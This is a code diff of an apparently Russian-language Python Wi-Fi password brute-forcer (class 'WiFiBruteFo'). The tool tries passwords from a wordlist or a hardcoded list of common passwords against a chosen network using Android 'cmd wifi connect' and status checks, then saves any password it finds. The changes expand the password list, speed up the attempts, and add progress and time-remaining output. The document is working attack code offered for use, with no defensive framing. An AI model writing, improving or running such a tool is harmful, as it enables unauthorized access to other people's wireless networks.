@@ -22,6 +22,7 @@ class Colors:
     GREEN = '\033[92m'
     YELLOW = '\033[93m'
     RED = '\033[91m'
+    WHITE = '\033[97m'
     END = '\033[0m'
     BOLD = '\033[1m'
     UNDERLINE = '\033[4m'
@@ -141,7 +142,7 @@ class WiFiBruteFo:
                 print(f"{Colors.CYAN}📂 Найден словарь: {wordlist_path}\n{Colors.END}")
                 try:
                     with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
-                        passwords = [line.strip() for line in f if line.strip()]
+                        passwords = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                     return passwords
                 except Exception as e:
                     print(f"{Colors.YELLOW}⚠️  Ошибка при чтении: {e}\n{Colors.END}")
@@ -154,7 +155,7 @@ class WiFiBruteFo:
             # Числа
             "123456", "12345678", "123456789", "1234567890",
             "111111", "222222", "333333", "444444", "555555",
-            "666666", "777777", "888888", "999999",
+            "666666", "777777", "888888", "999999", "000000",
             
             # Слова
             "password", "admin", "root", "user", "test",
@@ -165,17 +166,16 @@ class WiFiBruteFo:
             "root123", "test123", "user123",
             
             # Популярные комбинации
-            "12345678", "password", "admin", "123123",
-            "123456", "1234567890", "111111",
-            "qwerty123", "welcome", "monkey",
+            "12345678", "87654321", "123123",
+            "321321", "qwerty123", "welcome", "monkey",
             
             # WiFi типичные
             "wifi123", "wifipass", "password123",
-            "12345678", "87654321", "abcdefgh",
+            "87654321", "abcdefgh", "wifinetwork",
             
-            # Russian common
-            "пароль", "123456", "qwerty", "admin",
-            "password", "12345678", "1234567890",
+            # Простые
+            "1111", "2222", "3333", "4444", "5555",
+            "6666", "7777", "8888", "9999", "0000",
         ]
         
         return default_passwords
@@ -184,54 +184,40 @@ class WiFiBruteFo:
         """Проверка пароля подключением"""
         try:
             print(f"{Colors.WHITE}[{self.attempts}] Проверка: {Colors.YELLOW}{password}{Colors.END}", end='\r')
+            sys.stdout.flush()
             
             # Попытка подключиться к сети
-            result = subprocess.run(
-                ["cmd", "wifi", "connect", f"name={self.selected_network}", f"password={password}"],
-                capture_output=True,
-                text=True,
-                timeout=5
-            )
+            try:
+                result = subprocess.run(
+                    ["cmd", "wifi", "connect", f"name={self.selected_network}", f"password={password}"],
+                    capture_output=True,
+                    text=True,
+                    timeout=3
+                )
+            except:
+                pass
             
-            time.sleep(1)
+            time.sleep(0.5)
             
             # Проверка статуса подключения
-            status_result = subprocess.run(
-                ["cmd", "wifi", "get-status"],
-                capture_output=True,
-                text=True,
-                timeout=5
-            )
-            
-            output = status_result.stdout.lower()
-            
-            if "connected" in output or "подключено" in output or result.returncode == 0:
-                return True
-            
-            return False
-            
-        except Exception as e:
-            return False
-    
-    def test_password_advanced(self, password):
-        """Продвинутая проверка пароля"""
-        try:
-            # Способ 1: Проверка через netsh (если доступно)
-            cmd = f"netsh wlan connect name=\"{self.selected_network}\""
-            result = subprocess.run(cmd, capture_output=True, text=True, timeout=5, shell=True)
-            
-            time.sleep(1)
-            
-            # Проверка через ping
             try:
-                socket.gethostbyname('google.com')
-                return True
+                status_result = subprocess.run(
+                    ["cmd", "wifi", "get-status"],
+                    capture_output=True,
+                    text=True,
+                    timeout=3
+                )
+                
+                output = status_result.stdout.lower()
+                
+                if "connected" in output or "подключено" in output:
+                    return True
             except:
                 pass
             
             return False
             
-        except:
+        except Exception as e:
             return False
     
     def brute_force(self):
@@ -253,22 +239,24 @@ class WiFiBruteFo:
             
             if self.test_password(password):
                 elapsed_time = time.time() - self.start_time
-                print(f"\n{Colors.GREEN}{'=' * 60}")
+                print(f"\n\n{Colors.GREEN}{'=' * 60}")
                 print(f"✅ ПАРОЛЬ НАЙДЕН!{Colors.END}")
                 print(f"{Colors.GREEN}{'=' * 60}{Colors.END}")
                 print(f"{Colors.YELLOW}Сеть: {self.selected_network}{Colors.END}")
-                print(f"{Colors.YELLOW}Пароль: {password}{Colors.END}")
+                print(f"{Colors.YELLOW}Пароль: {Colors.GREEN}{password}{Colors.END}")
                 print(f"{Colors.CYAN}Попыток: {self.attempts}{Colors.END}")
                 print(f"{Colors.CYAN}Время: {elapsed_time:.2f} секунд\n{Colors.END}")
                 
                 self.found_password = password
                 return True
             
-            # Показываем прогресс каждые 10 попыток
-            if idx % 10 == 0:
+            # Показываем прогресс каждые 5 попыток
+            if idx % 5 == 0:
                 elapsed = time.time() - self.start_time
                 speed = idx / elapsed if elapsed > 0 else 0
-                print(f"{Colors.CYAN}Попытка {idx}/{len(passwords)} | Скорость: {speed:.1f} п/сек{Colors.END}", end='\r')
+                remaining = (len(passwords) - idx) / speed if speed > 0 else 0
+                print(f"{Colors.CYAN}Попытка {idx}/{len(passwords)} | Скорость: {speed:.1f} п/сек | Осталось: {remaining:.0f}сек{Colors.END}        ", end='\r')
+                sys.stdout.flush()
         
         elapsed_time = time.time() - self.start_time
         print(f"\n\n{Colors.RED}❌ Пароль не найден за {elapsed_time:.2f} сек\n{Colors.END}")
@@ -295,7 +283,8 @@ class WiFiBruteFo:
             
             for filepath in possible_paths:
                 try:
-                    os.makedirs(os.path.dirname(filepath), exist_ok=True) if os.path.dirname(filepath) else None
+                    if os.path.dirname(filepath):
+                        os.makedirs(os.path.dirname(filepath), exist_ok=True)
                     with open(filepath, 'a', encoding='utf-8') as f:
                         f.write(json.dumps(result, ensure_ascii=False) + '\n')
                     print(f"{Colors.GREEN}✅ Результат сохранен: {filepath}\n{Colors.END}")
@@ -344,6 +333,8 @@ class WiFiBruteFo:
             print(f"\n\n{Colors.YELLOW}⚠️  Программа прервана пользователем\n{Colors.END}")
         except Exception as e:
             print(f"\n{Colors.RED}❌ Ошибка: {e}\n{Colors.END}")
+            import traceback
+            traceback.print_exc()
 
 
 def main():
